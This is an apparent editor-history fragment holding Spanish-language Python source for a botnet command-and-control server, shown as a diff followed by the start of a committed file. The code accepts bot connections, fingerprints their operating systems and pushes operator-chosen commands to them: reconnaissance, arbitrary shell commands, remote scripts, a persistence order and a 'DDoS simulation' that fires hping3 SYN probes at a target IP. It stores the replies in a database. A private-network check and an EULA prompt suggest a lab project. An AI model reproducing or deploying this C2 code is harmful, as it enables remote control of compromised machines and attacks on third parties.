{ip}\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id, config):\r\n+    \"\"\"\r\n+    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n+\r\n+    :param conn: El socket del bot conectado.\r\n+    :type conn: socket.socket\r\n+    :param addr: La direcci贸n IP y puerto del bot.\r\n+    :type addr: tuple\r\n+    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n+    :type bot_id: int\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        ip, port = addr\r\n+        hostname = socket.gethostbyaddr(ip)[0]\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+\r\n+        # Recibir identificador 煤nico\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n+\r\n+        # Detectar sistema operativo\r\n+        try:\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            sistemas_operativos[conn] = os\r\n+            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n+        except Exception as e:\r\n+            print(f\"Error al detectar OS de {addr}: {e}\")\r\n+            os = \"desconocido\"\r\n+\r\n+        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n+\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    continue\r\n+\r\n+                # Guardar la respuesta en el diccionario sin imprimirla\r\n+                respuestas_bots[bot_id] = data\r\n+                actualizar_bot_en_db(config, ip)\r\n+                agregar_respuesta_en_db(config, bot_id, data)\r\n+\r\n+            except socket.timeout:\r\n+                print(f\"Tiempo de espera agotado con {addr}.\")\r\n+            except Exception as e:\r\n+                print(f\"Error con {addr}: {e}\")\r\n+                break\r\n+\r\n+        # Manejo de desconexi贸n\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+\r\n+def aceptar_conexiones(server, config):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n+\r\n+    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n+    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n+    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n+    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n+    enviados por el usuario.\r\n+\r\n+    :param server: El socket del servidor C&C.\r\n+    :type server: socket.socket\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Aceptando conexiones de bots\")\r\n+        bot_id = 1 # Contador de bots\r\n+        while server_running:\r\n+            try:\r\n+                conn, addr = server.accept() # Aceptar la conexi贸n\r\n+                bots.append(conn) # Agregar el bot a la lista\r\n+                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id, config)).start() # Crear un hilo para manejar la conexi贸n\r\n+                bot_id += 1 # Incrementar el contador de bots\r\n+            except OSError:\r\n+                if not server_running:\r\n+                    break\r\n+                else:\r\n+                    raise\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n+\r\n+def servidor_CnC(HOST, PORT, config):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n+    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n+    que permite al usuario interactuar con los bots conectados.\r\n+\r\n+    :param HOST: La direcci贸n IP del servidor.\r\n+    :type HOST: str\r\n+    :param PORT: El puerto de escucha del servidor.\r\n+    :type PORT: int\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n+        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n+        server.listen(5) # Escuchar conexiones\r\n+        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server, config)).start() # Crear un hilo para aceptar conexiones\r\n+\r\n+        while server_running:\r\n+            print(\"\\nMen煤 Principal:\")\r\n+            print(\"1. Listar bots conectados\")\r\n+            print(\"2. Enviar comandos\")\r\n+            print(\"3. Cerrar conexi贸n con un bot\")\r\n+            print(\"4. Salir\")\r\n+            opcion = input(\"Seleccione una opci贸n: \")\r\n+\r\n+            if opcion == \"1\":\r\n+                listar_bots()\r\n+            elif opcion == \"2\":\r\n+                menu_comandos()\r\n+            elif opcion == \"3\":\r\n+                cerrar_conexion_bots()\r\n+            elif opcion == \"4\":\r\n+                logging.info(\"Servidor CnC detenido\")\r\n+                print(\"Saliendo de la consola...\")\r\n+                server_running = False\r\n+                server.close()\r\n+                break\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n+        \r\n+        # Esperar a que todos los hilos de bots terminen\r\n+        for bot in bots:\r\n+            bot.close()\r\n+        for thread in threading.enumerate():\r\n+            if thread is not threading.current_thread():\r\n+                thread.join()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el servidor CnC: {e}\")\r\n+\r\n+def listar_bots():\r\n+    \"\"\"\r\n+    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n+    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n+    conexi贸n.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Listando bots conectados\")\r\n+        if bots:\r\n+            print(\"\\nBots conectados:\")\r\n+            for bot in bots: # Recorrer la lista de bots\r\n+                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n+                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n+        else:\r\n+            print(\"No hay bots conectados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+\r\n+def menu_comandos():\r\n+    \r\n+    \"\"\"\r\n+    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n+    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n+    todos los bots o en algunos seleccionados manualmente.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Mostrando men煤 de comandos\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione el tipo de comandos:\")\r\n+        print(\"1. Comandos b谩sicos\")\r\n+        print(\"2. Comandos avanzados\")\r\n+        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            print(\"\\nComandos b谩sicos disponibles:\")\r\n+            print(\"1. Obtener informaci贸n del sistema\")\r\n+            print(\"2. Consultar conexiones de red\")\r\n+            print(\"3. Ver procesos en ejecuci贸n\")\r\n+            print(\"4. Listar archivos en el directorio actual\")\r\n+            print(\"5. Obtener la IP p煤blica\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            print(\"\\nComandos avanzados disponibles:\")\r\n+            print(\"1. Simular ataque DDoS\")\r\n+            print(\"2. Detener simulaci贸n de DDoS\")\r\n+            print(\"3. Ejecutar un comando personalizado\")\r\n+            print(\"4. Ejecutar un script remoto\")\r\n+            print(\"5. Intentar asegurar la persistencia\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n+                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n+                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    print(\"Protocolo no v谩lido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n+                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                print(\"Seleccione el tipo de script:\")\r\n+                print(\"1. Python\")\r\n+                print(\"2. Bash\")\r\n+                print(\"3. Otro (especificar)\")\r\n+                \r\n+                tipo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n+                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n+                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n+                print(\"1. Escribirlo aqu铆\")\r\n+                print(\"2. Proporcionar la ruta de un archivo\")\r\n+                \r\n+                metodo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if metodo == \"1\":\r\n+                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        try:\r\n+                            linea = input()\r\n+                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n+                                break\r\n+                            lineas.append(linea)\r\n+                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n+                            print(\"\\nEntrada cancelada.\")\r\n+                            return\r\n+                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        print(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot espec铆fico\")\r\n+        print(\"5. Lista de bots espec铆ficos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opci贸n: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no v谩lido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n+\r\n+    :param bot: El socket del bot al que se enviar谩 el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots():\r\n+    \r\n+    \"\"\"\r\n+    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n+    los bots conectados.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        listar_bots()\r\n+        \r\n+        try:\r\n+            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n+        except ValueError:\r\n+            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot: # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close() # Cerrar la conexi贸n\r\n+            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot) # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot] # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n+\r\n+        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n+\r\n+def cargar_configuracion():\r\n+    \r\n+    \"\"\"\r\n+    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n+    en el directorio \"config\" del proyecto.\r\n+\r\n+    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n+        * BASE_DIR: Directorio base del proyecto.\r\n+        * HOST: Direcci贸n IP del servidor.\r\n+        * PORT: Puerto de escucha del servidor.\r\n+        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n+        * DB_PATH: Ruta del archivo de la base de datos.\r\n+        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n+        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n+        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n+        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n+\r\n+    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n+    se muestra un mensaje de error y se sale del programa con un estado de\r\n+    error.\r\n+\r\n+    :return: Un objeto con la configuraci贸n cargada.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cargando configuraci贸n del servidor\")\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n+        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n+\r\n+        if not os.path.exists(CONFIG_PATH):\r\n+            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n+\r\n+        config = configparser.ConfigParser()\r\n+        config.read(CONFIG_PATH)\r\n+\r\n+        return {\r\n+            \"BASE_DIR\": BASE_DIR,\r\n+            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n+            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n+            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n+            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n+            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n+            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n+            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n+            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+        }\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n+        exit(1)\r\n+\r\n+def iniciar_servidor():\r\n+    \"\"\"\r\n+    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n+    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n+\r\n+    Luego, inicializa la base de datos, configura el sistema de logging y\r\n+    lanza el servidor de C2.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n+        if not esRedPrivada(config[\"HOST\"]):\r\n+            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n+            sys.exit(1)\r\n+        verificar_eula(\"servidor\")\r\n+        init_db(config[\"DB_PATH\"])\r\n+        servidor_CnC(config[\"HOST\"], config[\"PORT\"], config)\r\n+        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        iniciar_servidor()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                }
            ],
            "date": 1740219834635,
            "name": "Commit-0",
            "content": "import logging\r\nimport socket\r\nimport sys\r\nimport threading\r\nimport time\r\nimport os\r\nimport ipaddress\r\nimport requests\r\nimport sqlite3\r\nimport configparser\r\nfrom datetime import datetime\r\n\r\nbots = [] # List de bots\r\nbot_ids = {} # Diccinario con los IDS de los bots\r\nsistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\nrespuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\nddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\nserver_running = True  # Variable para controlar el estado del servidor\r\n\r\ndef configurar_logging(config):\r\n    \"\"\"\r\n    Configura el sistema de logging del servidor.\r\n\r\n    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n\r\n    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n    La ruta se crea si no existe.\r\n\r\n    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n\r\n    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n\r\n    :param config: Un objeto con la configuraci贸n del servidor.\r\n    \"\"\"\r\n    try:\r\n        log_level = config[\"LOG_LEVEL\"].upper()\r\n        log_file = config[\"SERVER_LOG_FILE\"]\r\n\r\n        log_levels = {\r\n            \"DEBUG\": logging.DEBUG,\r\n            \"INFO\": logging.INFO,\r\n            \"WARNING\": logging.WARNING,\r\n            \"ERROR\": logging.ERROR,\r\n            \"CRITICAL\": logging.CRITICAL\r\n        }\r\n        log_level = log_levels.get(log_level, logging.INFO)\r\n\r\n        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n\r\n        logging.basicConfig(\r\n            level=log_level,\r\n            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n            handlers=[\r\n                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n                logging.StreamHandler(sys.stdout)\r\n            ]\r\n        )\r\n\r\n        logging.info(\"Sistema de logging configurado correctamente.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al configurar el logging: {e}\")\r\n\r\n# Inicializar la base de datos\r\ndef init_db(DB_PATH):\r\n    \"\"\"\r\n    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n\r\n    Crea la carpeta y el archivo de la base de datos si no existe,\r\n    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n\r\n    :param DB_PATH: La ruta del archivo de la base de datos.\r\n    :type DB_PATH: str\r\n    \"\"\"\r\n    try:\r\n        db_dir = os.path.dirname(DB_PATH)\r\n        if not os.path.exists(db_dir):\r\n            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n\r\n        conn = sqlite3.connect(DB_PATH)\r\n        cursor = conn.cursor()\r\n\r\n        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n                            identificador TEXT UNIQUE,\r\n                            ip TEXT,\r\n                            hostname TEXT,\r\n                            os TEXT,\r\n                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n                        )''')\r\n\r\n        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n                            bot_id INTEGER,\r\n                            respuesta TEXT,\r\n                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n                        )''')\r\n\r\n        conn.commit()\r\n        conn.close()\r\n        logging.info(\"Base de datos inicializada correctamente.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n\r\ndef agregar_respuesta_en_db(config, bot_id, respuesta):\r\n    \"\"\"\r\n    Agrega una respuesta de un bot a la base de datos SQLite.\r\n\r\n    :param config: Un objeto con la configuraci贸n del servidor.\r\n    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n    :type bot_id: int\r\n    :param respuesta: La respuesta del bot.\r\n    :type respuesta: str\r\n    \"\"\"\r\n    try:\r\n        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n        cursor = conn.cursor()\r\n        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n        conn.commit()\r\n        